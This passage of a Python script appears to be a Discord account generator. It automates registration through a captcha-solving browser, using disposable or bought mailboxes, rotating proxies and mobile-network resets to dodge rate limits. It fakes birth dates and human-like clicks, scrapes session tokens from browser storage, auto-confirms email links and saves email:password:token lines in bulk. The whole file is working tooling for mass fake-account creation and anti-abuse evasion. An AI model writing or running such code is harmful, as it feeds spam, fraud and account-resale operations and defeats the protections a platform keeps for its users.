                msg = email.message_from_bytes(msg_data[0][1])
                subject = str(msg.get("Subject", ""))
                sender = str(msg.get("From", "")).lower()
                if subject_filter not in subject and "discord" not in sender:
                    continue
                if msg.is_multipart():
                    for part in msg.walk():
                        if part.get_content_type() == "text/html":
                            body = part.get_payload(decode=True).decode(errors="ignore")
                            soup = BeautifulSoup(body, "html.parser")
                            for a_tag in soup.find_all("a", href=True):
                                href = a_tag["href"]
                                if "click.discord.com/ls/click" in href:
                                    try:
                                        resolved = requests.get(href, allow_redirects=True, timeout=10, verify=False)
                                        if "discord.com/verify" in resolved.url:
                                            mail.logout()
                                            return resolved.url
                                    except: pass
                else:
                    body = msg.get_payload(decode=True).decode(errors="ignore")
                    match = re.search(r"https://click\.discord\.com/ls/click\?[^\"'<>]+", body)
                    if match:
                        try:
                            resolved = requests.get(match.group(), allow_redirects=True, timeout=10, verify=False)
                            if "discord.com/verify" in resolved.url:
                                mail.logout()
                                return resolved.url
                        except: pass
            mail.logout()
        except: pass
        time.sleep(interval)
    return None

def fetch_verification_url_cybertemp(email: str, api_key: str = None, timeout: int = 120) -> Optional[str]:
    headers = {}
    if api_key:
        headers["X-API-KEY"] = api_key
    base_url = "https://api.cybertemp.xyz/getMail"
    start = time.time()
    seen_ids = set()
    while time.time() - start < timeout:
        try:
            resp = requests.get(base_url, params={"email": email, "limit": 25}, headers=headers, timeout=20, verify=False)
            if resp.status_code != 200:
                time.sleep(3)
                continue
            messages = resp.json()
            if not isinstance(messages, list):
                time.sleep(3)
                continue
            for msg in messages:
                msg_id = msg.get("id", "")
                if msg_id in seen_ids:
                    continue
                seen_ids.add(msg_id)
                subject = (msg.get("subject") or "").lower()
                from_addr = (msg.get("from") or "").lower()
                body_html = msg.get("html") or msg.get("text") or ""
                is_discord = "discord" in from_addr or "noreply@discord.com" in from_addr
                is_verify = any(k in subject for k in ("verify", "confirm", "email"))
                if not (is_discord and is_verify):
                    continue
                direct = re.search(r'https://discord\.com/verify\?token=[^"\'\>\s&]+(?:&[^"\'\>\s]+)*', body_html)
                if direct:
                    return direct.group(0)
                for pat in [r'https://click\.discord\.com/ls/click\?[^"\'\>\s]+', r'https://links\.discord\.com[^"\'\>\s]+']:
                    for m in re.finditer(pat, body_html):
                        url = m.group(0)
                        try:
                            r2 = requests.get(url, allow_redirects=True, verify=False)
                            if "discord.com/verify" in r2.url:
                                return r2.url
                            found = re.search(r'https://discord\.com/verify\?token=[^"\'\>\s]+', r2.text)
                            if found:
                                return found.group(0)
                        except: pass
        except: pass
        time.sleep(3)
    return None

def verify_email_afhamxmailz(email: str, api_url: str = None, api_key: str = None, timeout: int = 120, interval: int = 3) -> Optional[str]:
    log.info(f"Polling AfhamXMailz inbox for verification email: {email}")
    class TempService:
        def __init__(self):
            self.api_url = api_url or "https://afhamxmailz.com"
            self.api_key = api_key or ""
            self.session = requests.Session()
            self.session.verify = False
            if self.api_key:
                self.session.headers.update({"X-API-KEY": self.api_key})
        def check_inbox(self, email):
            try:
                resp = self.session.get(f"{self.api_url}/getMail", params={"email": email}, timeout=15)
                if resp.status_code == 200:
                    data = resp.json()
                    messages = data if isinstance(data, list) else data.get("messages", [])
                    return {"success": True, "messages": messages}
                return {"success": False, "error": f"HTTP {resp.status_code}"}
            except Exception as e:
                return {"success": False, "error": str(e)}
    service = TempService()
    start = time.time()
    seen_ids = set()
    while time.time() - start < timeout:
        try:
            result = service.check_inbox(email)
            if not result.get("success"):
                time.sleep(interval)
                continue
            messages = result.get("messages", [])
            if not messages:
                time.sleep(interval)
                continue
            for msg in messages[:10]:
                msg_id = msg.get("id") or msg.get("mail_id")
                if msg_id and msg_id in seen_ids:
                    continue
                if msg_id:
                    seen_ids.add(msg_id)
                subject = (msg.get("subject") or "").lower()
                from_addr = (msg.get("from") or "").lower()
                body_html = msg.get("html") or msg.get("text") or ""
                is_discord = "discord" in from_addr or "noreply@discord.com" in from_addr
                is_verify = any(k in subject for k in ("verify", "confirm", "email"))
                if not (is_discord and is_verify):
                    continue
                direct = re.search(r'https://discord\.com/verify\?token=[^"\'\>\s&]+(?:&[^"\'\>\s]+)*', body_html)
                if direct:
                    log.success("Extracted direct verify link from AfhamXMailz!")
                    return direct.group(0)
                for pat in [r'https://click\.discord\.com/ls/click\?[^"\'\>\s]+', r'https://links\.discord\.com[^"\'\>\s]+']:
                    for m in re.finditer(pat, body_html):
                        url = m.group(0)
                        try:
                            r2 = requests.get(url, allow_redirects=True, verify=False)
                            if "discord.com/verify" in r2.url:
                                log.success("Extracted verify link via redirect from AfhamXMailz!")
                                return r2.url
                            found = re.search(r'https://discord\.com/verify\?token=[^"\'\>\s]+', r2.text)
                            if found:
                                log.success("Extracted verify link from redirect body from AfhamXMailz!")
                                return found.group(0)
                        except: pass
        except Exception as e:
            log.debug(f"AfhamXMailz poll error: {e}")
        time.sleep(interval)
    log.warning("AfhamXMailz: Verification email not found after timeout")
    return None

# ============================================================================
# SAVE ACCOUNT
# ============================================================================

def save_account_to_file(email: str, password: str, token: str, status: str):
    try:
        if status == 'VALID':
            verified, _ = check_email_verified_api(token)
            if verified is False:
                output_file = OUTPUT_DIR / "unverified.txt"
            else:
                output_file = OUTPUT_DIR / "valid.txt"
        elif status == 'LOCKED':
            output_file = OUTPUT_DIR / "locked.txt"
        else:
            output_file = OUTPUT_DIR / "invalid.txt"
        with LOCK:
            with open(output_file, 'a', encoding='utf-8') as f:
                f.write(f"{email}:{password}:{token}\n")
        log.success(f"✓ Saved to {output_file.name}")
        return True
    except Exception as e:
        log.error(f"Failed to save account: {e}")
        return False

# ============================================================================
# ASYNC TOKEN EXTRACTION
# ============================================================================

async def wait_for_discord_token(page, timeout: int = 45, email: str = None, password: str = None, proxy: str = None) -> Optional[str]:
    log.info("Extracting Discord token...")
    start = time.time()
    while time.time() - start < timeout:
        try:
            token = await page.evaluate("localStorage.getItem('token')")
            if token:
                token = token.strip('"')
                if token and len(token) > 20:
                    log.success("✓ Token extracted from localStorage!")
                    return token
        except: pass
        if email and password:
            try:
                token = await fetch_discord_token(email, password, proxy)
                if token:
                    log.success("✓ Token fetched via API!")
                    return token
            except: pass
        await asyncio.sleep(2)
    log.error("Failed to extract token within timeout")
    return None

# ============================================================================
# REGISTRATION FORM FILLING (COMPLETELY REWRITTEN – NO STALE NODES)
# ============================================================================

async def fill_registration_form(page, email, display_name, username, password):
    """Fill Discord registration form with retries and fresh element lookups."""
    try:
        log.info("Filling form...")

        # Helper to find and fill an input
        async def fill_input(selector, value, max_retries=3):
            for attempt in range(max_retries):
                try:
                    el = await page.find(selector)
                    if el:
                        await el.send_keys(value)
                        return True
                    await asyncio.sleep(0.5)
                except Exception as e:
                    log.debug(f"Fill attempt {attempt+1} failed for {selector}: {e}")
                    await asyncio.sleep(0.5)
            log.error(f"Failed to fill {selector} after {max_retries} attempts")
            return False

        # Fill fields sequentially with small delays
        if not await fill_input('input[name="email"]', email):
            return False
        await asyncio.sleep(0.3)

        if not await fill_input('input[name="global_name"]', display_name):
            return False
        await asyncio.sleep(0.3)

        if not await fill_input('input[name="username"]', username):
            return False
        await asyncio.sleep(0.3)

        if not await fill_input('input[aria-label="Password"]', password):
            return False
        await asyncio.sleep(0.3)

        # DOB
        await fill_date_of_birth(page)

        # Click checkboxes via JS
        await page.evaluate(JS_UTILS)
        try:
            result = await page.evaluate('window.utils.clickAllCheckboxes()')
            if isinstance(result, list) and result:
                result = result[0]
            if isinstance(result, dict) and result.get('clicked', 0) > 0:
                log.success(f"✓ Clicked {result.get('clicked')} checkbox(es)")
        except Exception as e:
            log.debug(f"Checkbox click error: {e}")

        # Submit button - try multiple methods
        clicked = False
        await asyncio.sleep(0.5)

        # Method 1: find by button text
        try:
            btns = await page.find_all('button')
            for btn in btns:
                try:
                    text = await btn.get('textContent') or ""
                    if any(k in text for k in ['Continue', 'Create', 'Submit', 'Register']):
                        await btn.click()
                        clicked = True
                        break
                except:
                    continue
        except:
            pass

        # Method 2: submit type
        if not clicked:
            try:
                submit = await page.find('[type="submit"]')
                if submit:
                    await submit.click()
                    clicked = True
            except:
                pass

        # Method 3: JS fallback
        if not clicked:
            try:
                clicked = await page.evaluate('''() => {
                    const btns = document.querySelectorAll('button');
                    for (const b of btns) {
                        const t = b.textContent || '';
                        if (t.includes('Continue') || t.includes('Create') || t.includes('Submit')) {
                            b.click();
                            return true;
                        }
                    }
                    return false;
                }''')
            except:
                pass

        if not clicked:
            log.error("Could not click submit")
            return False

        log.success("✓ Form submitted!")
        return True
    except Exception as e:
        log.error(f"Form fill error: {e}")
        return False

async def fill_date_of_birth(page):
    months = ["January", "February", "March", "April", "May", "June",
              "July", "August", "September", "October", "November", "December"]
    day = str(random.randint(1, 28))
    month = random.choice(months)
    year = str(random.randint(1990, 2004))
    try:
        await page.evaluate(f'''
        (async () => {{
            async function selectByTyping(label, value) {{
                const combo = document.querySelector(`div[role="combobox"][aria-label="${{label}}"]`);
                if (!combo) return false;
                combo.click();
                await new Promise(r => setTimeout(r, 400));
                for (let char of value) {{
                    const event = new KeyboardEvent('keydown', {{ key: char, bubbles: true, cancelable: true }});
                    document.activeElement.dispatchEvent(event);
                    await new Promise(r => setTimeout(r, 20));
                }}
                await new Promise(r => setTimeout(r, 300));
                const enterEvent = new KeyboardEvent('keydown', {{ key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true, cancelable: true }});
                document.activeElement.dispatchEvent(enterEvent);
                await new Promise(r => setTimeout(r, 400));
                document.activeElement.blur();
                return true;
            }}
            await selectByTyping("Month", "{month}");
            await new Promise(r => setTimeout(r, 600));
            await selectByTyping("Day", "{day}");
            await new Promise(r => setTimeout(r, 600));
            await selectByTyping("Year", "{year}");
            await new Promise(r => setTimeout(r, 1000));
            const btn = document.querySelector('button[type="submit"]');
            if (btn) btn.click();
        }})()
        ''')
        log.success(f"✓ DOB Filled via Keyboard: {month} {day}, {year}")
    except Exception as e:
        log.error(f"Keyboard DOB failed: {e}")

async def wait_for_account_creation(page, timeout=300) -> bool:
    start = time.time()
    last_url = ""
    while time.time() - start < timeout:
        await asyncio.sleep(0.3)
        try:
            raw = await page.evaluate('window.location.href')
            if hasattr(raw, 'value'):
                current_url = raw.value or ""
            elif isinstance(raw, tuple):
                r = raw[0]
                current_url = (r.value if hasattr(r, 'value') else str(r)) if r else ""
            else:
                current_url = str(raw) if raw else ""
            if current_url and current_url != last_url:
                log.info(f"URL: {current_url}")
                last_url = current_url
            if not current_url:
                continue
            skip = ['discord.com/register', 'discord.com/login', 'about:blank', 'chrome://']
            if 'discord.com' in current_url and not any(s in current_url for s in skip):
                log.success(f"Account created! Redirected to: {current_url}")
                return True
        except: pass
    log.error("Timeout waiting for account creation")
    return False

# ============================================================================
# UTILITY FUNCTIONS
# ============================================================================

def generate_random_string(length: int) -> str:
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def generate_username() -> str:
    adjectives = ['Cool', 'Epic', 'Super', 'Mega', 'Ultra', 'Pro', 'Elite', 'Master']
    nouns = ['Gamer', 'Player', 'User', 'Hero', 'Legend', 'Champion', 'Warrior']
    return f"{random.choice(adjectives)}{random.choice(nouns)}{random.randint(1232323200, 923322323232999)}"

def generate_password(length: int = 16) -> str:
    chars = string.ascii_letters + string.digits + "!@#$%^&*"
    password = ''.join(random.choices(chars, k=length))
    if not any(c.isupper() for c in password):
        password = password[:1].upper() + password[1:]
    if not any(c.isdigit() for c in password):
        password = password[:-1] + str(random.randint(0, 9))
    return password

# ============================================================================
# PROXY HANDLER
# ============================================================================

def load_proxies(config: dict) -> list:
    proxy_config = config.get("proxy", {})
    if not proxy_config.get("enabled", False):
        return []
    proxy_file = proxy_config.get("file", "input/proxies.txt")
    proxy_path = Path(proxy_file)
    if not proxy_path.exists():
        log.warning(f"Proxy file not found: {proxy_file}")
        return []
    try:
        with open(proxy_path, 'r', encoding='utf-8') as f:
            proxies = [line.strip() for line in f if line.strip()]
        if proxies:
            log.success(f"Loaded {len(proxies)} proxies")
            return proxies
    except Exception as e:
        log.error(f"Error loading proxies: {e}")
    return []

def get_random_proxy(proxies: list) -> str:
    if not proxies:
        return None
    return random.choice(proxies)

def format_proxy(proxy_str: str) -> Optional[str]:
    if not proxy_str:
        return None
    if proxy_str.startswith('http://') or proxy_str.startswith('https://'):
        return proxy_str
    parts = proxy_str.split(':')
    if len(parts) == 4:
        if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', parts[0]) or '.' in parts[0]:
            return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        else:
            return f"http://{parts[0]}:{parts[1]}@{parts[2]}:{parts[3]}"
    elif len(parts) == 2:
        return f"http://{parts[0]}:{parts[1]}"
    return f"http://{proxy_str}"

# ============================================================================
# MAIN WORKER FUNCTION (token extracted before about:blank)
# ============================================================================

async def worker(browser: uc.Browser, thread_idx: int = 0, proxy: str = None):
    global SESSION_CREATED, SESSION_STOP
    if SESSION_STOP:
        return

    # Proxy verification
    if proxy:
        try:
            log.info(f"[Thread {thread_idx}] Verifying proxy connection...")
            check_page = await browser.get("https://api.ipify.org", new_tab=True)
            ip_text = await check_page.get_content()
            ip_match = re.search(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', ip_text)
            if ip_match:
                log.success(f"[Thread {thread_idx}] Proxy IP Verified: {ip_match.group(0)}")
            else:
                log.warning(f"[Thread {thread_idx}] Proxy verification returned unexpected content.")
            await check_page.close()
        except Exception as e:
            log.error(f"[Thread {thread_idx}] Proxy connection failed: {e}")

    # Generate account details
    username = generate_username()
    display_name = random.choice([
        'Afham', 'Arhan', 'Ahmed', 'Ali', 'Hassan', 'Ibrahim', 'Karim', 'Malik', 'Nasser', 'Omar',
        'Rashid', 'Samir', 'Tariq', 'Walid', 'Youssef', 'Zahra', 'Amina', 'Fatima', 'Layla', 'Mariam',
        'Noor', 'Rania', 'Samira', 'Yasmin', 'Nadia', 'Hana', 'Iman', 'Leila', 'Maha', 'Salma',
        'Alex', 'Jordan', 'Taylor', 'Morgan', 'Casey', 'Riley', 'Sam', 'Blake', 'Drew', 'Avery',
        'Jamie', 'Parker', 'Quinn', 'Rowan', 'Sage', 'Scout', 'Skyler', 'Tatum', 'Vale', 'Xander',
        'Henrik', 'Johan', 'Magnus', 'Nils', 'Soren', 'Stellan', 'Anders', 'Lars', 'Mikael', 'Olaf',
        'Pierre', 'Jean', 'Claude', 'Antoine', 'Benoit', 'Cedric', 'Dominique', 'Fabrice', 'Gerard', 'Henri'
    ])

    # Get email
    email_from_api, email_password, email_token, email_uuid, email_provider = get_email_from_provider(config)
    if not email_from_api:
        log.error("Failed to get email")
        return
    email = email_from_api
    password = email_password
    log.email_got(email)

    # Get page
    page = await get_nopecha_page(browser)
    if page is None:
        log.error("Could not get browser page")
        return

    # Wait for page load
    for _ in range(30):
        if await page.query_selector('input[name="email"]'):
            break
        await asyncio.sleep(0.5)

    log.register_page()
    if not await fill_registration_form(page, email, display_name, username, password):
        return
    log.filled_info()

    # Random clicks
    try:
        for _ in range(5):
            await page.mouse_click(random.randint(100, 800), random.randint(100, 600))
            await asyncio.sleep(random.uniform(0.05, 0.15))
    except Exception:
        pass

    log.solving_captcha()
    created = await wait_for_account_creation(page)
    if created:
        log.captcha_solved()
    else:
        log.error("Account creation failed")
        return

    # ==============================================================
    # Extract token BEFORE navigating to about:blank
    # ==============================================================
    token = await wait_for_discord_token(page, email=email, password=password, proxy=proxy)

    # Now navigate away
    try:
        await page.get('about:blank')
        await asyncio.sleep(2)
    except Exception:
        pass

    if token:
        token = token.strip('"')
        token_match = re.search(r'([a-zA-Z0-9_-]{20,})\.([a-zA-Z0-9_-]{6})\.([a-zA-Z0-9_-]{27,})', token)
        if token_match:
            token = f"{token_match.group(1)}.{token_match.group(2)}.{token_match.group(3)}"
        log.token_got(token)

        status = check_token(token)
        log.token_status(status)

        if status == 'VALID':
            verified, user_email = check_email_verified_api(token)
            if verified is False:
                log.info("Email not verified – attempting auto‑verification...")
                verify_url = None
                if email_provider == "cybertemp":
                    api_key = config.get("email_provider", {}).get("api_key", "")
                    verify_url = fetch_verification_url_cybertemp(email, api_key or None)
                elif email_provider in ["hotmail007", "zeus"]:
                    imap_server = "outlook.office365.com"
                    if email_provider == "hotmail007":
                        imap_server = config.get("email_provider", {}).get("hotmail007", {}).get("imap_server", "outlook.office365.com")
                    elif email_provider == "zeus":
                        imap_server = config.get("email_provider", {}).get("zeus_x", {}).get("imap_server", "outlook.office365.com")
                    verify_url = verify_email_imap(email, email_password, imap_server)
                elif email_provider == "tempmail":
                    verify_url = verify_email_tempmail(email, email_token)
                elif email_provider == "afhamxmailz":
                    api_url = config.get("email_provider", {}).get("afhamxmailz", {}).get("api_url", "https://afhamxmailz.com")
                    api_key = config.get("email_provider", {}).get("afhamxmailz", {}).get("api_key", "")
                    verify_url = verify_email_afhamxmailz(email, api_url, api_key)

                if verify_url:
                    log.info(f"Visiting verification URL: {verify_url[:80]}...")
                    try:
                        vpage = await browser.get(verify_url)
                        await asyncio.sleep(5)
                        for _ in range(12):
                            await asyncio.sleep(5)
                            verified, _ = check_email_verified_api(token)
                            if verified:
                                log.verified_mail()
                                break
                    except Exception as e:
                        log.warning(f"Verification visit error: {e}")
                else:
                    log.warning("No verification URL found – account may remain unverified")

        # Save account
        save_account_to_file(email, password, token, status)

        with LOCK:
            SESSION_CREATED += 1
            created_now = SESSION_CREATED

        log.success(f"[Thread {thread_idx}] Account #{created_now} created and saved")

        # ADB reset
        if ADB_ENABLED:
            try:
                log.info(f"[Thread {thread_idx}] Running ADB network reset...")
                adb_reset_mobile_network(ADB_WAIT_TIME)
            except Exception as e:
                log.warning(f"[Thread {thread_idx}] ADB reset failed: {e}")

        # Clear storage
        try:
            await page.evaluate("() => { localStorage.clear(); sessionStorage.clear(); }")
        except Exception:
            pass

        if SESSION_TARGET > 0 and created_now >= SESSION_TARGET:
            with LOCK:
                SESSION_STOP = True
            log.success(f"Target reached! {created_now}/{SESSION_TARGET} accounts. Stopping...")
            return
    else:
        log.warning("Could not extract token")

# ============================================================================
# MAIN
# ============================================================================

async def main():
    global SESSION_TARGET, SESSION_CREATED, SESSION_STOP, ADB_ENABLED, ADB_WAIT_TIME

    if sys.platform == 'win32':
        import ctypes
        try:
            ctypes.windll.kernel32.SetConsoleMode(ctypes.windll.kernel32.GetStdHandle(-11), 7)
        except Exception:
            pass

    print()
    print(f"{CYAN}        ███████╗██╗   ██╗     ██████╗ ███████╗███╗   ██╗{RESET}")
    print(f"{CYAN}        ██╔════╝██║   ██║    ██╔════╝ ██╔════╝████╗  ██║{RESET}")
    print(f"{CYAN}        █████╗  ██║   ██║    ██║  ███╗█████╗  ██╔██╗ ██║{RESET}")
    print(f"{CYAN}        ██╔══╝  ╚██╗ ██╔╝    ██║   ██║██╔══╝  ██║╚██╗██║{RESET}")
    print(f"{CYAN}        ███████╗ ╚████╔╝     ╚██████╔╝███████╗██║ ╚████║{RESET}")
    print(f"{CYAN}        ╚══════╝  ╚═══╝       ╚═════╝ ╚══════╝╚═╝  ╚═══╝{RESET}")
    print()

    print(f"{CYAN}============================================================{RESET}")
    print(f"{WHITE}  Select Mail Provider:{RESET}")
    print(f"{CYAN}============================================================{RESET}")
    print()
    print(f"{YELLOW}  1.{RESET} {GREEN}Hotmail007{RESET}    {GRAY}(Outlook / Hotmail accounts){RESET}")
    print(f"{YELLOW}  2.{RESET} {GREEN}ZeusX{RESET}         {GRAY}(Key-based, https://zeus-x.ru/){RESET}")
    print(f"{YELLOW}  3.{RESET} {GREEN}TempMail{RESET}      {GRAY}(Free temp mail — no API key){RESET}")
    print(f"{YELLOW}  4.{RESET} {GREEN}CyberTemp{RESET}     {GRAY}(cybertemp.xyz){RESET}")
    print(f"{YELLOW}  5.{RESET} {GREEN}AfhamXMailz{RESET}   {GRAY}(Custom domain – like CyberTemp){RESET}")
    print()
    print(f"{CYAN}============================================================{RESET}")
    while True:
        choice = input(f"  {GREEN}› Email Provider (1/2/3/4/5): {RESET}").strip()
        if choice == '1':
            config["email_provider"]["name"] = "hotmail007"
            break
        elif choice == '2':
            config["email_provider"]["name"] = "zeus"
            break
        elif choice == '3':
            config["email_provider"]["name"] = "tempmail"
            break
        elif choice == '4':
            config["email_provider"]["name"] = "cybertemp"
            break
        elif choice == '5':
            config["email_provider"]["name"] = "afhamxmailz"
            break
        else:
            print(f"  {RED}Invalid choice, try again.{RESET}")

    provider = config.get("email_provider", {}).get("name", "")
    log.info(f"Provider: {provider}")

    if provider == "cybertemp":
        api_key = config.get("email_provider", {}).get("api_key", "")
        if api_key:
            log.info("CyberTemp: Priority mode")
        else:
            log.info("CyberTemp: Free tier")
    elif provider == "hotmail007":
        log.info("Hotmail007: Purchased accounts")
    elif provider == "tempmail":
        log.info("TempMail: Free temporary mail (no API key, no password)")
    elif provider == "zeus":
        log.info("Zeus-X: Custom Mail Server")
    elif provider == "afhamxmailz":
        log.info("AfhamXMailz: Disposable email (like CyberTemp)")

    SESSION_TARGET = 0
    while True:
        try:
            count = input(f"{WHITE}Accounts to create (0=infinite): {RESET}").strip()
            if count.isdigit():
                SESSION_TARGET = int(count)
                break
        except:
            pass

    print()
    if SESSION_TARGET == 0:
        log.info("Mode: INFINITE - Press Ctrl+C to stop")
    else:
        log.info(f"Mode: FIXED - Will create {SESSION_TARGET} account(s)")
    print()

    global ADB_ENABLED, ADB_WAIT_TIME
    adb_enabled = config.get("adb", {}).get("enabled", False)
    if adb_enabled:
        print(f"{CYAN}============================================================{RESET}")
        print(f"{WHITE}  ADB Mobile Network Reset (After Each Account):{RESET}")
        print(f"{CYAN}============================================================{RESET}")
        print()
        adb_reset_choice = input(f"  {GREEN}› Enable ADB network reset after each account? (y/n): {RESET}").strip().lower()
        if adb_reset_choice == 'y':
            ADB_ENABLED = True
            ADB_WAIT_TIME = config.get("adb", {}).get("network_reset_wait", 7)
            print(f"{GREEN}✓ ADB network reset ENABLED - will run after each account creation{RESET}")
            print()

    tasks = [asyncio.create_task(worker_loop(i)) for i in range(THREAD_COUNT)]
    await asyncio.gather(*tasks)
    print()
    log.success(f"Completed! Created {SESSION_CREATED} account(s)")

async def worker_loop(thread_idx: int):
    global SESSION_STOP
    profile_dir = Path(__file__).parent / f"nopecha_profile_{thread_idx}"
    retry_count = 0
    max_retries = 3
    
    while not SESSION_STOP:
        proxies = load_proxies(config)
        raw_proxy = get_random_proxy(proxies)
        proxy = format_proxy(raw_proxy) if raw_proxy else None

        browser = await setup_nopecha(thread_idx, proxy)
        if not browser:
            log.error(f"[Thread {thread_idx}] Failed to setup browser")
            await asyncio.sleep(5)
            continue

        try:
            await worker(browser, thread_idx, proxy)
            retry_count = 0  # Reset on success
        except Exception as e:
            retry_count += 1
            log.error(f"[Thread {thread_idx}] Worker crashed: {e} (attempt {retry_count}/{max_retries})")
            if retry_count >= max_retries:
                log.error(f"[Thread {thread_idx}] Max retries reached, restarting browser...")
                retry_count = 0

        if SESSION_STOP:
            try: 
                await browser.stop()
            except: 
                pass
            break

        log.info(f"[Thread {thread_idx}] Closing browser...")
        try: 
            await browser.stop()
        except: 
            pass

        if sys.platform == 'win32':
            try:
                profile_str = str(profile_dir.absolute()).replace('\\', '\\\\')
                subprocess.run(f'wmic process where "name=\'brave.exe\' and commandline like \'%{profile_str}%\'" call terminate', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                subprocess.run(f'wmic process where "name=\'chrome.exe\' and commandline like \'%{profile_str}%\'" call terminate', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except: 
                pass

        await asyncio.sleep(2)
        rotate_nopecha_key()
        cooldown = 70
        log.info(f"[Thread {thread_idx}] Entering {cooldown}s cooldown...")
        await asyncio.sleep(cooldown)

# ============================================================================
# ENTRY POINT
# ============================================================================

if __name__ == "__main__":
    warnings.filterwarnings('ignore', category=ResourceWarning)
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[WARNING]{RESET} Stopped by user")
    except Exception as e:
        print(f"\n{RED}[ERROR]{RESET} {e}")